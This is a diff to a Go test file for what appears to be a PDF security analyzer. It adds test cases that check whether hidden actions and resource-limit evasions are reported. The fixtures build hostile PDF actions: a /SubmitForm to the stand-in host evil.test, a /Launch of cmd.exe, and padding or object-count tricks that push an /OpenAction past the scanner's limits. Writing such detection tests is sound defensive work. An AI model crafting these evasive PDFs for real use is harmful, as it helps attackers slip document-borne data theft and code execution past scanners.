@@ -108,6 +108,17 @@ func TestAnalyze(t *testing.T) {
 	}
 	manyObjs := strings.Repeat("1 0 obj\nendobj\n", pdf.MaxObjects+1)
 	sharedStr := "(" + strings.Repeat("A", 2<<20) + ")"
+	// capDoc has an object stream with 2*MaxObjects+5 empty members, then member 99, an action
+	// that /OpenAction reaches.
+	capCount := 2*pdf.MaxObjects + 5
+	var capHead, capBody strings.Builder
+	for i := range capCount {
+		fmt.Fprintf(&capHead, "%d %d ", 100+i, i*3)
+		capBody.WriteString("[] ")
+	}
+	fmt.Fprintf(&capHead, "99 %d ", capCount*3)
+	capBody.WriteString("<< /S /SubmitForm /F (http://evil.test/x) >>")
+	capDoc := doc(obj(1, "<< /OpenAction 99 0 R >>"), stream(5, fmt.Sprintf("/Type /ObjStm /N %d /First %d /Filter /FlateDecode", capCount+1, capHead.Len()), deflate(t, []byte(capHead.String()+capBody.String()))))
 	fiveBombs := ""
 	for i := range 5 {
 		fiveBombs += stream(i+1, "/Filter /FlateDecode", deflate(t, zeros(pdf.MaxStreamBytes)))
@@ -384,11 +395,25 @@ func TestAnalyze(t *testing.T) {
 			wantRules: []string{"GAL-PDF-001"},
 		},
 		{
-			name:      "object stream with an undecodable filter is skipped",
+			name:      "object stream with an undecodable filter hides its members and is reported as budget",
 			kind:      ident.PDF,
 			data:      objstmDoc([]string{catalog, action}, "/LZWDecode", func(b []byte) []byte { return b }, ""),
 			wantRules: []string{"GAL-PDF-007"},
-			wantSkips: []string{"unsupported"},
+			wantSkips: []string{"budget", "unsupported"},
+		},
+		{
+			name:      "object stream cut at the per-stream limit hides the action behind it and is reported as budget",
+			kind:      ident.PDF,
+			data:      objstmDoc([]string{"<< /P (" + strings.Repeat("A", pdf.MaxStreamBytes+1<<20) + ") >>", "<< /Type /Catalog /OpenAction 12 0 R >>", "<< /S /Launch /F (cmd.exe) >>"}, "/FlateDecode", flate, ""),
+			wantRules: []string{"GAL-PDF-007"},
+			wantSkips: []string{"budget", "unsupported"},
+		},
+		{
+			name:      "object stream with more members than the cap hides the last one and is reported as budget",
+			kind:      ident.PDF,
+			data:      capDoc,
+			timeout:   30 * time.Second,
+			wantSkips: []string{"budget"},
 		},
 		{
 			name:      "a huge array in one member does not hide the next member",
@@ -401,6 +426,18 @@ func TestAnalyze(t *testing.T) {
 			kind:      ident.PDF,
 			data:      doc(obj(1, "<< /S /Launch /A ["+strings.Repeat("0 ", 1<<20+10)+"] >>")),
 			wantRules: []string{"GAL-PDF-003"},
+			wantSkips: []string{"budget"},
+		},
+		{
+			name:      "a content stream over the token limit is reported as too_large",
+			kind:      ident.PDF,
+			data:      doc(obj(1, "<< /Type /Catalog >>"), stream(2, "/Filter /FlateDecode", deflate(t, []byte(strings.Repeat("0 0 m 1 1 l S\n", 160000))))),
+			wantSkips: []string{"too_large"},
+		},
+		{
+			name:      "an inline action dictionary longer than the examined tokens is reported as budget",
+			kind:      ident.PDF,
+			data:      doc(obj(1, "<< /OpenAction << /Pad ["+strings.Repeat("0 ", 5000)+"] /S /SubmitForm /F (http://evil.test/x) >> >>")),
 			wantSkips: []string{"budget"},
 		},
 		{
